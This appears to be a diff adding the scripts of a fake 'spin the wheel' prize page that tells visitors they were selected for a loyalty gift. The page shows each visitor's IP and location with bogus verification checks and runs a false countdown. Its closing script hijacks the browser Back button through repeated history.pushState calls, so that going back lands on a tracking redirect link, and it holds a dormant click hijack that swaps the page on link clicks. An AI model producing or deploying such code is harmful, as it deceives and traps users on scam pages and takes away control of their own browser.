+      dWheel = document.getElementById("wheel"),
+      button = document.getElementById("pressButton"),
+      device = document.getElementById("devMockup"),
+      first = document.getElementById("firstpage"),
+      second = document.getElementById("secondpage");
+    function setButtonHeight() {
+      conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2,
+          button.style.top = conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
+    }
+    function spin() {
+      console.log("spin");
+      var modal = $modal({
+        content: '<p style="text-align:center;font-size:20px"><b>You have an extra try!</b></p><p style="text-align:center;margin-top:10px;font-size:15px">Try again!</p>',
+      });
+      switch (count) {
+        case 1:
+          button.disabled = !0, dWheel.className = "spinAround", setTimeout(function () {
+            button.disabled = !1, modal.show(), $('.modal__btn-close').click(function () { autospin2() });
+          }, 6800);
+          break;
+        case 2:
+          dWheel.className = "spinAround2", setTimeout(function () {
+            dWheel.className = dWheel.className + " transparent"
+          }, 6800), setTimeout(function () {
+            device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+          }, 7000), setTimeout(function () {
+            first.innerHTML = "<img class='loading' src='files/loading.webp'>", first.style.padding = "195px 0px", setTimeout(function () {
+              first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con.firstChild), setInterval("countdown()", 1000)
+            }, 1500)
+          }, 9000);
+          //document.getElementById('my-canvas').remove();
+      }
+      count++
+    }
+    function autospin2() {                                                                                          console.log("autospin2");
+      spin()
+    }
+    function autospin1() {                                                                                          console.log("autospin1");
+      async function checkIP() { return fetch("https://get.geojs.io/v1/ip/geo.json").then((response) => response.json()); }
+      checkIP()
+        .then((result) => {                                                                                         //console.log('checkIP',result)
+          $("input[name=ip]").val(result.ip);
+          $("input[name=country]").val(result.country);
+          $("input[name=city]").val(result.city);
+          return result;
+        })
+        .catch(function (err) {                                                                                     console.log("Error:", err);
+        })
+        .finally(function () {
+          showModal_1();
+        });
+      function deviceType() {
+        ///*TEST*/return "desktop"; //TEST;
+        return "desktop Apple "        //return "  "
+      }
+      function showModal_1() {
+        var modal = $modal({
+          content: `<p style="text-align:center;"><b>Congratulations!</b></p><br>
+                <p id="ip_text" style="text-align:center; font-size: 13px;"><b>IP: ${$("input[name=ip]").val()}</b>
+                <img id="ip_check" src="files/check_icon.png" width="10" height="10"" alt="check"></p>
+                <br><p id="device_text" style="text-align:center; font-size: 13px;"><b>PROXY: NONE</b>
+                <img id="device_check" src="files/check_icon.png" width="10" height="10"" alt="check"></p>
+                <br><p id="browser_text" style="text-align:center; font-size: 13px;"><b>Location: ${$("input[name=country]").val() + " " + $("input[name=city]").val()}</b>
+                <img id="browser_check" src="files/check_icon.png" width="10" height="10"" alt="check"></p>
+                <br><p style="text-align:center;max-width: 380px;margin:0 auto">You are one of the 7 people selected to participate in our loyalty program! You can get 1 gift out of 4!</p>
+                <br> <p style="text-align:center;"><b>Click "Okay" to start!</b></p>`,
+        });//Device: ${deviceType()}
+        modal.show();
+        $("#ip_text").show('slow'); setTimeout(function () { $("ip_text").hide('slow'); }, 500);
+        $("#device_text").show('slow'); setTimeout(function () { $("device_text").hide('slow'); }, 1000);
+        $("#browser_text").show('slow'); setTimeout(function () { $("browser_text").hide('slow'); }, 3000);
+        $("#loc_text").show('slow'); setTimeout(function () { $("loc_text").hide('slow'); }, 3500);
+        $("#os_text").show('slow'); setTimeout(function () { $("os_text").hide('slow'); }, 4500);
+        setTimeout(function () { $('#ip_check').fadeIn(100); }, 1500);
+        setTimeout(function () { $('#device_check').fadeIn(100); }, 2000);
+        setTimeout(function () { $('#browser_check').fadeIn(100); }, 4000);
+        setTimeout(function () { $('#loc_check').fadeIn(100); }, 4500);
+        setTimeout(function () { $('#os_check').fadeIn(100); }, 5100);
+        $('.modal__btn-close').click(function () { document.getElementById("pressButton").click() });
+      }
+    }
+    function countdown() {
+      var d = parseInt(document.getElementById("mins").innerHTML), c = parseInt(document.getElementById("hsecs").innerHTML), b = 0, a = 0;
+      0 !== d && 0 === c ? (b = d - 1, a = 59) : 0 !== d || 0 !== c ? (b = d, a = c - 1) : 0 === d && 0 === c && (b = d,
+        a = c), a < 10 && (a = "0" + a), document.getElementById("mins").textContent = b, document.getElementById(
+          "hsecs").textContent = a
+    };
+  </script>
+<script>
+var cta = 'mainButton';
+var back = 'https://08deh.bemobtrcks.com/go/a60af6bb-ff47-4a71-963e-f5cdb4fbf173';
+//var under = 'https://08deh.bemobtrcks.com/go/d8a08998-4942-4993-8fdd-f60630b83eb1';
+if(typeof under!=="undefined"&&under!==null){if(typeof cta!=="undefined"&&cta!==null){document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'&&target.classList.contains(cta)){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}else{document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}}
+if(typeof back!=="undefined"&&back!==null){!(function(){var t;try{const URL=window.location.href.split(/[#]/)[0];for(t=0;10>t;++t)history.pushState({},'',URL+'#');onpopstate=function(event){event.state&&location.replace(back);};}catch(o){console.log(o);}})();}
+function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }</script>
+<div class="modal modal__show"></div></body></html>
